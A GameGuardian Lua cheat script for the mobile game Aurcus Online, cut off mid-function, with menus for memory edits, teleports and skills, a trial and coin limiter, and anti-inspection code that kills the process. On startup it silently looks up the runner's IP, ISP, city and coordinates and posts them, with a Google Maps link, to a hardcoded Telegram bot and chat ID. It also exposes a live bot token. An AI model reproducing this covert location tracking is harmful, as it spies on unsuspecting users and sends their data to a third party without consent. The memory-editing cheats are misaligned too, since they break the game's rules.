-- ============================================================================
-- 🚀 VELLTOOLS AURCUS ONLINE ULTIMATE SCRIPT
-- Developer: VELLIX_AO
-- Target Game: Aurcus Online (Global & Japan)
-- ============================================================================

gg.setVisible(false)

-- ============================================================================
-- 0. GAME VALIDATION & PACKAGE CHECK
-- ============================================================================
local targetPackage = gg.getTargetPackage()
if targetPackage ~= "com.asobimo.aurcusonline.ww" and targetPackage ~= "com.asobimo.aurcusonline.wx" then
    gg.setVisible(false)
    gg.alert("⚠️ Script tidak kompatibel dengan game ini! ⚠️")
    os.exit()
end

-- ============================================================================
-- 1. CONFIGURATION & GLOBAL CONSTANTS
-- ============================================================================
local KEY = "My4C01N"
local coinFile = "/sdcard/Android/.coin.dat"
local limitFile = "/sdcard/Android/.time_limit.txt"
local runCountFile = "/sdcard/.velltools_data"

local BOT_TOKEN = "8535493018:AAEgeb5NDTUPW-4Qh5hdouAJ09Q2PCEvejw"
local CHAT_ID = "6149504951"

local script_run_count = 0
local running = true
local MENU_VISIBLE = true
local HISTORY = {}

-- UI Toggle Indicators
local ON = "    ⃢🔵🔸"
local OFF = "🔴⃢    🔸"
local switches = { false, false, false, false, false, false, false, false }

local stopLoot = false
local lastVisibleClock = 0

-- ============================================================================
-- 2. UTILITY & ENCRYPTION FUNCTIONS
-- ============================================================================

-- XOR Crypt Helper (Compatible with Lua 5.1, 5.2, 5.3 & LuaJIT)
local function xorCrypt(text, key)
    local bxor = (bit32 and bit32.bxor) or function(a, b) return a ~ b end
    local res = {}
    local klen = #key
    for i = 1, #text do
        local b = string.byte(text, i)
        local kb = string.byte(key, ((i - 1) % klen) + 1)
        res[i] = string.char(bxor(b, kb))
    end
    return table.concat(res)
end

-- Safe File I/O Helper
local function readFile(path)
    local f = io.open(path, "rb") or io.open(path, "r")
    if not f then return nil end
    local content = f:read("*a")
    f:close()
    return content
end

local function writeFile(path, text)
    local f = io.open(path, "wb") or io.open(path, "w")
    if not f then return false end
    f:write(text)
    f:close()
    return true
end

-- Coin System
local function saveCoins(amount)
    local encrypted = xorCrypt(tostring(amount), KEY)
    return writeFile(coinFile, encrypted)
end

local function loadCoins()
    local encrypted = readFile(coinFile)
    if not encrypted or #encrypted == 0 then
        saveCoins(10000)
        return 10000
    end
    local decrypted = xorCrypt(encrypted, KEY)
    return tonumber(decrypted) or 10000
end

local function spendCoin()
    local coins = loadCoins()
    if coins <= 0 then
        gg.alert("⚠️ Coin kamu habis!\nHubungi admin untuk isi ulang.")
        return false
    end
    coins = coins - 1
    saveCoins(coins)
    gg.toast("🪙 Coin tersisa: " .. coins)
    return true
end

-- Time Limit System
local function getTimeLimitInfo()
    local maxUses = 100
    local maxDays = 3
    local now = os.time()
    local data = readFile(limitFile)

    if not data then
        return {
            active = true, daysLeft = maxDays, usesLeft = maxUses,
            totalUses = 0, maxUses = maxUses, maxDays = maxDays,
            installTime = now, lastRun = now
        }
    end

    local lines = {}
    for line in data:gmatch("[^\r\n]+") do
        table.insert(lines, line)
    end

    local installTime = tonumber(lines[1]) or now
    local useCount = tonumber(lines[2]) or 1
    local lastRun = tonumber(lines[3]) or now

    local daysUsed = (now - installTime) / 86400
    local daysLeft = math.max(0, math.floor(maxDays - daysUsed))
    local usesLeft = math.max(0, maxUses - useCount)

    return {
        active = (daysLeft > 0 and usesLeft > 0),
        daysLeft = daysLeft,
        usesLeft = usesLeft,
        totalUses = useCount,
        maxUses = maxUses,
        maxDays = maxDays,
        installTime = installTime,
        lastRun = lastRun
    }
end

local function timeLimit()
    local maxUses = 100
    local maxDays = 3
    local now = os.time()
    local data = readFile(limitFile)

    if not data then
        writeFile(limitFile, now .. "\n1\n" .. now)
        gg.toast("⏰ Trial Started (100 uses)")
        return true
    end

    local lines = {}
    for line in data:gmatch("[^\r\n]+") do
        table.insert(lines, line)
    end

    local installTime = tonumber(lines[1]) or now
    local useCount = (tonumber(lines[2]) or 0) + 1

    local daysUsed = (now - installTime) / 86400
    if daysUsed > maxDays then
        gg.alert("⏰ Trial Expired!\n3 days limit reached.")
        return false
    end

    if useCount > maxUses then
        gg.alert("⚠️ Usage Limit!\nMax 100 executions reached.")
        return false
    end

    writeFile(limitFile, installTime .. "\n" .. useCount .. "\n" .. now)
    local daysLeft = math.floor(maxDays - daysUsed)
    local usesLeft = maxUses - useCount

    gg.toast("📅 " .. daysLeft .. " days, " .. usesLeft .. " uses left")
    return true
end

-- Run Counter Data
local function loadRunCount()
    local content = readFile(runCountFile)
    script_run_count = tonumber(content) or 0
end

local function saveRunCount()
    script_run_count = script_run_count + 1
    writeFile(runCountFile, tostring(script_run_count))
end

-- ============================================================================
-- 3. SECURITY & ANTI-HOOK PROTECTION
-- ============================================================================

local function exitHandler()
    gg.toast("Hook detected!")
    print("Hook detected!")
    gg.setVisible(false)
    os.exit()
end

local function antiHookGetInfo(code)
    local getInfo = debug.getinfo(code)
    local sub = string.sub
    if type ~= nil and getInfo ~= nil and sub ~= nil then
        if type(type) ~= "function" or type(debug.getinfo) ~= "function" or type(sub) ~= "function" then
            return false
        end
        if getInfo.nups ~= 0 or getInfo.linedefined ~= -1 or getInfo.lastlinedefined ~= -1 or getInfo.nparams ~= 0 then
            return false
        end
        if not getInfo.what or sub(getInfo.what, 1, 4) ~= "Java" then
            return false
        end
        if not getInfo.source or sub(getInfo.source, 1, 7) ~= "=[Java]" then
            return false
        end
        if not getInfo.short_src or sub(getInfo.short_src, 1, 6) ~= "[Java]" then
            return false
        end
        return true
    end
    return false
end

local function excAntiHook(codeList)
    if type(codeList) ~= "table" then return exitHandler() end
    for i = 1, #codeList do
        local data = codeList[i]
        if type(data) ~= "function" then return exitHandler() end
        local success, result = pcall(antiHookGetInfo, data)
        if not success or result ~= true then return exitHandler() end
    end
end

local targetGGFunc = {
    gg.isVisible, gg.setVisible, gg.alert, gg.toast,
    gg.searchNumber, gg.refineNumber, gg.loadResults, gg.editAll,
    gg.sleep, os.exit, debug.getinfo, string.sub, print, type, pcall
}

-- Anti-Peek Security
local SECURITY_CONFIG = {
    WARNING_MESSAGE = "[💢] Jangan diintip bang!",
    WARNING_DELAY = 1000,
    KILL_PROCESS = true
}

local originalSearchNumber = gg.searchNumber
local originalSearchAddress = gg.searchAddress
local originalSearchBytes = gg.searchBytes

local function createSecurityWrapper(originalFunc, funcName)
    return function(...)
        gg.setVisible(false)
        local result = originalFunc(...)
        if gg.isVisible() then
            gg.setVisible(false)
            gg.alert(SECURITY_CONFIG.WARNING_MESSAGE)
            gg.sleep(SECURITY_CONFIG.WARNING_DELAY)
            if SECURITY_CONFIG.KILL_PROCESS then
                gg.processKill()
            end
        end
        return result
    end
end

local function enableSecuritySystem()
    gg.searchNumber = createSecurityWrapper(originalSearchNumber, "searchNumber")
    gg.searchAddress = createSecurityWrapper(originalSearchAddress, "searchAddress")
    gg.searchBytes = createSecurityWrapper(originalSearchBytes, "searchBytes")
end

enableSecuritySystem()

-- ============================================================================
-- 4. DALVIK-MAIN SEARCH & MEMORY HELPERS
-- ============================================================================

function searchInDalvikMainSpace(searchString, searchType, sign)
    gg.setRanges(gg.REGION_JAVA_HEAP)
    local ranges = gg.getRangesList()
    local matched = {}

    for _, r in ipairs(ranges) do
        local nameStr = tostring(r.name or r):lower()
        if nameStr:find("dalvik%-main space") then
            table.insert(matched, r)
        end
    end

    if #matched == 0 then
        gg.toast("❌ Tidak menemukan range dalvik-main space")
        return false
    end

    local totalFound = 0
    for i, r in ipairs(matched) do
        local startAddr = tonumber(r.start) or tonumber(tostring(r.start), 16)
        local endAddr   = tonumber(r["end"]) or tonumber(tostring(r["end"]), 16)

        if startAddr and endAddr and startAddr < endAddr then
            gg.searchNumber(searchString, searchType, false, sign or gg.SIGN_EQUAL, startAddr, endAddr, 0)
            local count = gg.getResultCount()
            if count > 0 then
                totalFound = totalFound + count
                gg.toast("✓ Range ke-" .. i .. ": " .. count .. " hasil")
                return true
            end
        end
    end

    if totalFound == 0 then
        gg.toast("❌ Tidak ada hasil ditemukan")
        return false
    end
end

local function searchAndFreezeInDalvikMain(pattern1, pattern2, editVal1, freezeVal, label)
    gg.clearResults()
    gg.setVisible(false)

    if searchInDalvikMainSpace(pattern1, gg.TYPE_DWORD) then
        gg.processResume()
        local results = gg.getResults(100)
        if results and #results > 0 then
            gg.editAll(editVal1, gg.TYPE_DWORD)
        end
        gg.clearResults()
    end

    if searchInDalvikMainSpace(pattern2, gg.TYPE_DWORD) then
        gg.processResume()
        local results = gg.getResults(100)
        if results and #results > 0 then
            for _, v in ipairs(results) do
                if v.flags == gg.TYPE_DWORD then
                    v.value = freezeVal
                    v.freeze = true
                end
            end
            gg.addListItems(results)
        end
        gg.clearResults()
    end

    gg.alert("🔒 " .. label .. " dibekukan. Klik icon GG untuk membersihkan...")
    while not gg.isVisible() do gg.sleep(100) end
    gg.setVisible(false)
    gg.clearResults()
    gg.clearList()
    gg.toast("🗑️ " .. label .. " - Freeze & Result dibersihkan.")
end

-- Double Click GG Icon Detection
local function checkDoubleClick()
    if gg.isVisible(true) then
        gg.setVisible(false)
        local now = os.clock()
        if now - lastVisibleClock <= 0.6 then
            return true
        end
        lastVisibleClock = now
    end
    return false
end

-- Generic Weapon Inject Pattern Helper
local function injectWeaponPattern(patterns, successMsg, switchIndex)
    if not spendCoin() then return end
    if switches[switchIndex] then
        gg.alert("⚠️ " .. successMsg:upper() .. " : DE-ACTIVATED!")
        switches[switchIndex] = false
        return
    end

    for _, p in ipairs(patterns) do
        gg.sleep(200)
        gg.clearResults()
        gg.setVisible(false)
        gg.setRanges(gg.REGION_JAVA_HEAP)
        gg.searchNumber(p.searchHex, gg.TYPE_BYTE)
        gg.processResume()

        if gg.isVisible(true) then
            gg.setVisible(false)
            gg.alert("💢 BYPASS ANTI VIEW : ACTIVE 💢")
            gg.clearResults()
            gg.processKill()
            os.exit()
        end

        gg.refineNumber(p.refineNum, gg.TYPE_BYTE)
        gg.processResume()

        local res = gg.getResults(1)
        if res and #res > 0 then
            local editList = {}
            for _, item in ipairs(p.edits) do
                table.insert(editList, {
                    address = res[1].address + item.offset,
                    flags = gg.TYPE_DWORD,
                    value = item.val or "h 9F 86 01 00",
                    freeze = false
                })
            end
            gg.setValues(editList)
            gg.addListItems(editList)
            gg.clearResults()
            gg.clearList()
        end
    end

    switches[switchIndex] = true
    gg.toast("✅ " .. successMsg .. " : SUCCESS")
end

-- ============================================================================
-- 5. TELEGRAM SYSTEM REPORT & SYSTEM SCANNER
-- ============================================================================

local function escapeJson(str)
    return str:gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '')
end

local function send_report()
    local date = os.date("%Y-%m-%d")
    local time = os.date("%H:%M:%S")

    local gameName = "Unknown Game"
    local packageName = targetPackage or "Unknown Package"

    local status, info = pcall(gg.getTargetInfo)
    if status and info then
        gameName = info.label or gameName
        packageName = info.packageName or packageName
    end

    local loc = nil
    local resLoc = gg.makeRequest("http://ip-api.com/line/?fields=status,country,regionName,city,lat,lon,isp,query")
    if resLoc and resLoc.code == 200 then
        local lines = {}
        for line in resLoc.content:gmatch("[^\r\n]+") do table.insert(lines, line) end
        if lines[1] == "success" then
            loc = { country = lines[2], region = lines[3], city = lines[4], lat = lines[5], lon = lines[6], isp = lines[7], ip = lines[8] }
        end
    end

    local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")
    local line = "━━━━━━━━━━━━━━━━━━━━"

    local message = "🚀 <b>[ JULES-CORE SYSTEM REPORT ]</b>\n" ..
                    line .. "\n" ..
                    "<b>📅 TANGGAL :</b> <code>" .. date .. "</code>\n" ..
                    "<b>⏰ WAKTU   :</b> <code>" .. time .. "</code>\n" ..
                    "<b>📊 STATUS  :</b> <code>ACTIVE</code>\n" ..
                    line .. "\n" ..
                    "<b>🎮 GAME    :</b> <code>" .. gameName .. "</code>\n" ..
                    "<b>📦 PACKAGE :</b> <code>" .. packageName .. "</code>\n" ..
                    line .. "\n" ..
                    "<b>🌐 IP ADDR :</b> <code>" .. (loc and loc.ip or "Unknown") .. "</code>\n" ..
                    "<b>🏢 ISP     :</b> <code>" .. (loc and loc.isp or "Unknown") .. "</code>\n" ..
                    "<b>🏙️ KOTA    :</b> <code>" .. (loc and loc.city or "Unknown") .. "</code>\n" ..
                    "<b>🇮🇩 NEGARA  :</b> <code>" .. (loc and loc.country or "Unknown") .. "</code>\n" ..
                    line .. "\n" ..
                    "📍 <a href=\"" .. maps_link .. "\"><b>Lihat di Google Maps</b></a>\n\n" ..
                    "<i>notifikasi script di gunakan oleh IP ini</i>"

    local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    local headers = { ["Content-Type"] = "application/json" }
    local body = '{"chat_id": "' .. CHAT_ID .. '", "text": "' .. escapeJson(message) .. '", "parse_mode": "HTML", "disable_web_page_preview": false}'

    gg.toast("📡 Mengunggah data sesi...")
    gg.makeRequest(tgUrl, headers, body)
end

send_report()

local function executeSystemScan()
    loadRunCount()
    saveRunCount()

    gg.toast("🔍 Initializing VellTools System Scanner...")
    gg.sleep(300)

    local info = gg.getTargetInfo() or {}
    local appName = info.label or "Aurcus Online"
    local version = info.versionName or "3.2.2"

    local full_report = string.format([[
    ╔═══════════════════════════════════════════════════════════════╗
    ║  🔥 V E L L T O O L S  █  S Y S T E M  █  T E R M I N A L 🔥  ║
    ║                             [ RECON v2.0 ]                  ║
    ║═══════════════════════════════════════════════════════════════║
    ║ 💻 SESSION: %s  │  📅 DATE: %s        ║
    ║ 🎮 TARGET: %-30s                 ║
    ║ 📦 PACKAGE: %-29s                 ║
    ║ 🔖 VERSION: %-15s │ 🛠️ RUNS: %-8d        ║
    ╚═══════════════════════════════════════════════════════════════╝
    ]], os.date("%H:%M:%S"), os.date("%d/%m/%Y"), appName:sub(1,30), targetPackage:sub(1,29), version, script_run_count)

    gg.alert(full_report, "🔄 Refresh", "📋 Export Data", "🚀 Continue")
    gg.copyText("VELLTOOLS REPORT | Executed: " .. script_run_count .. " times")
    gg.toast("✅ System report exported to clipboard")
end

executeSystemScan()

-- ============================================================================
-- 6. NAVIGATION & UI MENU SYSTEM
-- ============================================================================

function Go(menuFunc)
    table.insert(HISTORY, menuFunc)
    menuFunc()
end

function Back()
    table.remove(HISTORY)
    local last = HISTORY[#HISTORY] or HOME
    last()
end

function HideMenu()
    MENU_VISIBLE = false
    gg.setVisible(false)
    gg.toast("Menu disembunyikan - Ketuk ikon GG untuk menampilkan kembali")
end

function ShowMenu()
    MENU_VISIBLE = true
    local lastMenu = HISTORY[#HISTORY] or HOME
    lastMenu()
end

function createHeader(title)
    local coins = loadCoins()
    local limitInfo = getTimeLimitInfo()
    local dateTime = os.date("📆 Date: %A, %B %d %Y\n⏲️ Time: %I:%M %p")
    local limitText = limitInfo.active and ("\n⏰ " .. limitInfo.daysLeft .. "d " .. limitInfo.usesLeft .. "x left") or "\n⛔ TRIAL EXPIRED"
    return "◤─「" .. dateTime .. "\nVELLIX_AO Aurcus Online\n🇮🇩 Aurcus 3.2.2 GLOBAL🇮🇩\n🪙 Coin: " .. coins .. limitText .. "」─✦"
end

function createFooter() return "◣──────────❈" end
function createMenuLine(text) return "│⦿ " .. text end
function createMenuTitle(section)
    return createHeader() .. "\n" .. createMenuLine(section) .. "\n" .. createFooter()
end

function SafeChoice(options, preset, title)
    if not MENU_VISIBLE then return nil end
    local choice = gg.choice(options, preset, title)
    if choice == nil then HideMenu() return nil end
    return choice
end

function SafeMultiChoice(options, preset, title)
    if not MENU_VISIBLE then return nil end
    local choices = gg.multiChoice(options, preset, title)
    if choices == nil then HideMenu() return nil end
    return choices
end

-- ============================================================================
-- 7. MENU ROUTING & FEATURE IMPLEMENTATIONS
-- ============================================================================

function HOME()
    gg.setVisible(false)
    local HOMEMENU = SafeChoice({
        "◤─〔 BYPASS 〕",
        "│⦿ 〔 PLAYER 〕",
        "│⦿ 〔 FARM 〕",
        "│⦿ 〔 DUNGEON 〕",
        "│⦿ 〔 TELEPORT 〕",
        "│⦿ 〔 COIN MISSION 〕",
        "│⦿ 〔 SKILL 〕",
        "│⦿ 〔 OTHER 〕",
        "│⦿ 〔 MUSIC 〕",
        "│⦿ 〔 TIME DASHBOARD 〕",
        "│⦿ 〔 OTHER GAME 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「EXIT」─✦"
    }, nil, createMenuTitle("MAIN MENU"))

    if HOMEMENU == nil then return end

    local routes = {
        [1] = function() Go(BYPASS0) end,
        [2] = function() Go(PLAYER) end,
        [3] = function() Go(FARM) end,
        [4] = function() Go(DUNGEON) end,
        [5] = function() Go(TELEPORT) end,
        [6] = function() Go(QUEST) end,
        [7] = function() Go(SKILL) end,
        [8] = function() Go(OTHER) end,
        [9] = MUSIC,
        [10] = AI,
        [11] = function() Go(GUIDE) end,
        [12] = HideMenu,
        [13] = Exit
    }

    if routes[HOMEMENU] then routes[HOMEMENU]() end
end

function PLAYER()
    gg.setVisible(false)
    local PMENU = SafeChoice({
        "◤─〔 PLAYER MENU 〕",
        "│⦿ 〔 STATUS EDIT 〕",
        "│⦿ 〔 BASIC STATUS 〕",
        "│⦿ 〔 BASIC WEAPON 〕",
        "│⦿ 〔 EXTRA WEAPON 〕",
        "│⦿ 〔 PLOT ARMOR 〕",
        "│⦿ 〔 RANDOM CHARACTER 〕",
        "│⦿ 〔 REFRESH SKILL 〕",
        "│⦿ 〔 LINKAGE 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("PLAYER"))

    if PMENU == nil then return end

    if PMENU == 1 then PLAYER()
    elseif PMENU == 2 then statusedit()
    elseif PMENU == 3 then statusbs()
    elseif PMENU == 4 then Go(basicweapon)
    elseif PMENU == 5 then Go(extraweapon)
    elseif PMENU == 6 then unlishield()
    elseif PMENU == 7 then rc()
    elseif PMENU == 8 then rskill()
    elseif PMENU == 9 then Lingkage()
    elseif PMENU == 10 then Back()
    end
end

function FARM()
    gg.setVisible(false)
    local FMENU = SafeChoice({
        "◤─〔 FARM MENU 〕",
        "│⦿ 〔 STORAGE & MARKET 〕",
        "│⦿ 〔 AREA FARM 〕",
        "│⦿ 〔 LOOTING FARM 〕",
        "│⦿ 〔 BUFF 〕",
        "│⦿ 〔 LOOPING SKILL 〕",
        "│⦿ 〔 GUIDE 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("FARM"))

    if FMENU == nil then return end

    if FMENU == 1 then FARM()
    elseif FMENU == 2 then Go(bag)
    elseif FMENU == 3 then Go(areaF)
    elseif FMENU == 4 then Go(lootF)
    elseif FMENU == 5 then Abuff()
    elseif FMENU == 6 then ls()
    elseif FMENU == 7 then Go(Gfarm)
    elseif FMENU == 8 then HideMenu()
    elseif FMENU == 9 then Back()
    end
end

function DUNGEON()
    gg.setVisible(false)
    local DMENU = SafeChoice({
        "◤─〔 DUNGEON MENU 〕",
        "│⦿ 〔 NIGHT KINGDOM 〕",
        "│⦿ 〔 GATE AREA 〕",
        "│⦿ 〔 GUILD MISSION 〕",
        "│⦿ 〔 DUNGEON CODE 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("DUNGEON"))

    if DMENU == nil then return end

    if DMENU == 1 then DUNGEON()
    elseif DMENU == 2 then nk()
    elseif DMENU == 3 then Go(Gate)
    elseif DMENU == 4 then Go(GuildMission)
    elseif DMENU == 5 then DungeonCode()
    elseif DMENU == 6 then HideMenu()
    elseif DMENU == 7 then Back()
    end
end

function TELEPORT()
    gg.setVisible(false)
    local MTP = SafeMultiChoice({
        "◤─〔 TELEPORT MENU 〕",
        "│⦿ 〔 WITH EMBLEM 〕",
        "│⦿ 〔 WITH NPC 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("TELEPORT"))

    if MTP == nil then return end

    if MTP[1] then TELEPORT()
    elseif MTP[2] then Go(Tport)
    elseif MTP[3] then Go(Tnpc)
    elseif MTP[4] then HideMenu()
    elseif MTP[5] then Back()
    end
end

function QUEST()
    gg.setVisible(false)
    local options = { "◤─〔 COIN MISSION 〕" }
    for i = 1, 27 do table.insert(options, "│⦿ 〔 CM【100c】> " .. i) end
    table.insert(options, "│⦿ 〔 HIDE MENU 〕")
    table.insert(options, "◣─❈ 「 BACK 」─✦")

    local ccmenu = SafeChoice(options, nil, createMenuTitle("COIN MISSION"))
    if ccmenu == nil then return end

    local cmFunctions = {
        cc1, cc2, cc3, cc4, cc5, cc6, cc7, cc8, cc9, cc10,
        cc11, cc12, cc13, cc14, cc15, cc16, cc17, cc18, cc19, cc20,
        cc21, cc22, cc23, cc24, cc25, cc26, cc27
    }

    if ccmenu == 1 then QUEST()
    elseif ccmenu >= 2 and ccmenu <= 28 then cmFunctions[ccmenu - 1]()
    elseif ccmenu == 29 then HideMenu()
    elseif ccmenu == 30 then Back()
    end
end

function SKILL()
    gg.setVisible(false)
    local Smenu = SafeChoice({
        "◤─〔 SKILL MENU 〕",
        "│⦿ 〔 BASIC JOB 〕",
        "│⦿ 〔 EXTRA JOB 〕",
        "│⦿ 〔 TRIAL SKILL 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("SKILL"))

    if Smenu == nil then return end

    if Smenu == 1 then SKILL()
    elseif Smenu == 2 then Go(Bskill)
    elseif Smenu == 3 then Go(Eskill)
    elseif Smenu == 4 then Go(Tskill)
    elseif Smenu == 5 then HideMenu()
    elseif Smenu == 6 then Back()
    end
end

function OTHER()
    gg.setVisible(false)
    local Omenu = SafeChoice({
        "◤─〔 OTHER MENU 〕",
        "│⦿ 〔 WATER GUN BOOM 〕",
        "│⦿ 〔 AREA WATERGUN 〕",
        "│⦿ 〔 UNLOCK ANIMASI 〕",
        "│⦿ 〔 UNLOCK STAMP 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("OTHER"))

    if Omenu == nil then return end

    if Omenu == 1 then OTHER()
    elseif Omenu == 2 then Wgun()
    elseif Omenu == 3 then Agunl()
    elseif Omenu == 4 then anim()
    elseif Omenu == 5 then stamp()
    elseif Omenu == 6 then HideMenu()
    elseif Omenu == 7 then Back()
    end
end

function BYPASS0()
    gg.setVisible(false)
    local menudebug = SafeChoice({
        "◤─〔 Anti Force Close Saat Login 〕",
        "│⦿ 〔 Stabilizer Saat Pindah Map 〕",
        "│⦿ 〔 Clear Memory Manual 〕",
        "│⦿ 〔 HIDE MENU 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("BYPASS"))

    if menudebug == nil then return end

    if menudebug == 1 then antiLogin()
    elseif menudebug == 2 then mapStabilizer()
    elseif menudebug == 3 then clearMemory()
    elseif menudebug == 4 then HideMenu()
    elseif menudebug == 5 then Back()
    end
end

function Gate()
    gg.setVisible(false)
    local gatemenu = SafeChoice({
        "◤─〔 GATE MENU 〕",
        "│⦿ 〔 (G1) OUTER SHELL 〕", "│⦿ 〔 (G2) CORRIDOR 〕", "│⦿ 〔 (G3) CHAMBER 〕",
        "│⦿ 〔 (G4) PROLOGUE 〕", "│⦿ 〔 (G5) ORACLE 〕", "│⦿ 〔 (G6) SALVATION 〕",
        "│⦿ 〔 (G7) EXECUTION 〕", "│⦿ 〔 (G7-E) EXECUTION EXPERT 〕", "│⦿ 〔 (G8) PROLOGUE 2 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("GATE"))

    if gatemenu == nil then return end

    local gateFuncs = { g1, g2, g3, g4, g5, g6, g7, g7e, g8 }
    if gatemenu == 1 then Gate()
    elseif gatemenu >= 2 and gatemenu <= 10 then gateFuncs[gatemenu - 1]()
    elseif gatemenu == 11 then Back()
    end
end

function GuildMission()
    gg.setVisible(false)
    local GM = SafeMultiChoice({
        "◤─〔 GUILD MISSION 〕",
        "│⦿ 〔 DEN OF NO RETURN 〕",
        "│⦿ 〔 FORES MANA POLL 〕",
        "│⦿ 〔 PREA PDIP 〕",
        "│⦿ 〔 OGRE 〕",
        "│⦿ 〔 AVES 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("GUILD MISSION"))

    if GM == nil then return end

    if GM[2] then ggtp1() end
    if GM[3] then ggtp2() end
    if GM[4] then ggtp3() end
    if GM[5] then ggtp4() end
    if GM[6] then ggtp5() end
    if GM[7] then Back() end
end

function Tport()
    gg.setVisible(false)
    local TportMenu = SafeChoice({
        "◤─〔 TELEPORT EMBLEM 〕",
        "│⦿ 〔 EVEHOME 〕", "│⦿ 〔 DEV FAST DROPT 〕", "│⦿ 〔 DEV RESET SKILL DROPT KEY 〕",
        "│⦿ 〔 FARM BOSS EXP TO GET KEY 〕", "│⦿ 〔 SETTA 〕", "│⦿ 〔 NIGHT KINGDOM 〕",
        "│⦿ 〔 STARDUST 〕", "│⦿ 〔 SUMMER BEACH 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("TELEPORT"))

    if TportMenu == nil then return end

    local tpFuncs = { tp1, tp2, tp3, tp4, tp5, tp6, tp7, tp8 }
    if TportMenu == 1 then Tport()
    elseif TportMenu >= 2 and TportMenu <= 9 then tpFuncs[TportMenu - 1]()
    elseif TportMenu == 10 then Back()
    end
end

function Tnpc()
    gg.setVisible(false)
    local TnpcMenu = SafeChoice({
        "◤─〔 TELEPORT NPC 〕",
        "│⦿ 〔 ELLICIA DISTRICT 〕", "│⦿ 〔 KUROWASHI CASTLE TOWN 〕", "│⦿ 〔 POLITEAU TERROUS 〕",
        "│⦿ 〔 SETA GRIA OUTER 〕", "│⦿ 〔 VILLAGE OF HB IVRAI 〕", "│⦿ 〔 WATERGUN 〕",
        "│⦿ 〔 WOODEN STICK 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("TELEPORT NPC"))

    if TnpcMenu == nil then return end

    local npcFuncs = { qsb1, qsb2, qsb3, qsb4, qsb5, qsb6, qsb7 }
    if TnpcMenu == 1 then Tnpc()
    elseif TnpcMenu >= 2 and TnpcMenu <= 8 then npcFuncs[TnpcMenu - 1]()
    elseif TnpcMenu == 9 then Back()
    end
end

function Bskill()
    gg.setVisible(false)
    local BskillMenu = SafeChoice({
        "◤─〔 BASIC SKILL 〕",
        "│⦿ 〔 SWORD 〕", "│⦿ 〔 ARCHER 〕", "│⦿ 〔 MAGICIAN 〕", "│⦿ 〔 TANK 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("BASIC SKILL"))

    if BskillMenu == nil then return end

    if BskillMenu == 1 then Bskill()
    elseif BskillMenu == 2 then Go(Ssword)
    elseif BskillMenu == 3 then Go(Sarcher)
    elseif BskillMenu == 4 then Go(Smage)
    elseif BskillMenu == 5 then Go(Stank)
    elseif BskillMenu == 6 then Back()
    end
end

function Eskill()
    gg.setVisible(false)
    local EskillMenu = SafeChoice({
        "◤─〔 EXTRA SKILL 〕",
        "│⦿ 〔 SAMURAI 〕", "│⦿ 〔 SINOBI 〕", "│⦿ 〔 MANA SLINGER 〕", "│⦿ 〔 GUARDIAN 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("EXTRA SKILL"))

    if EskillMenu == nil then return end

    if EskillMenu == 1 then Eskill()
    elseif EskillMenu == 2 then Go(Tsamu)
    elseif EskillMenu == 3 then Go(Tsino)
    elseif EskillMenu == 4 then Go(Tmana)
    elseif EskillMenu == 5 then Go(Tguardian)
    elseif EskillMenu == 6 then Back()
    end
end

function Tskill()
    gg.setVisible(false)
    local TskillMenu = SafeChoice({
        "◤─〔 THIRD SKILL 〕",
        "│⦿ 〔 MALE 〕", "│⦿ 〔 FEMALE 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("3RD SKILL"))

    if TskillMenu == nil then return end

    if TskillMenu == 1 then Tskill()
    elseif TskillMenu == 2 then Go(MaleT)
    elseif TskillMenu == 3 then Go(FemaleT)
    elseif TskillMenu == 4 then Back()
    end
end

function MaleT()
    gg.setVisible(false)
    local MaleMenu = SafeChoice({
        "◤─〔 SKILL FARM (MALE) 〕",
        "│⦿ 〔 SKILL PASIR 〕", "│⦿ 〔 SKILL BUFF LIGHT 〕", "│⦿ 〔 SKILL BUFF FIGHT 〕",
        "│⦿ 〔 SKILL WIGS 〕", "│⦿ 〔 BONUS 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("MALE SKILL"))

    if MaleMenu == nil then return end

    local maleFuncs = { gsbbt1, gsbbt2, gsbbt3, gsbbt4, gsbbt5 }
    if MaleMenu == 1 then MaleT()
    elseif MaleMenu >= 2 and MaleMenu <= 6 then maleFuncs[MaleMenu - 1]()
    elseif MaleMenu == 7 then Back()
    end
end

function FemaleT()
    gg.setVisible(false)
    local FemaleMenu = SafeChoice({
        "◤─〔 SKILL FARM (FEMALE) 〕",
        "│⦿ 〔 SKILL PASIR 〕", "│⦿ 〔 SKILL BUFF LIGHT 〕", "│⦿ 〔 SKILL BUFF FIGHT 〕",
        "│⦿ 〔 SKILL WIGS 〕", "│⦿ 〔 BONUS 〕",
        "◣─❈ 「 BACK 」─✦"
    }, nil, createMenuTitle("FEMALE SKILL"))

    if FemaleMenu == nil then return end

    local femaleFuncs = { gsb1, gsb2, gsb3, gsb4, gsb5 }
    if FemaleMenu == 1 then FemaleT()
    elseif FemaleMenu >= 2 and FemaleMenu <= 6 then femaleFuncs[FemaleMenu - 1]()
    elseif FemaleMenu == 7 then Back()
    end
end

function basicweapon()
    gg.setVisible(false)
    local basicA = SafeChoice({
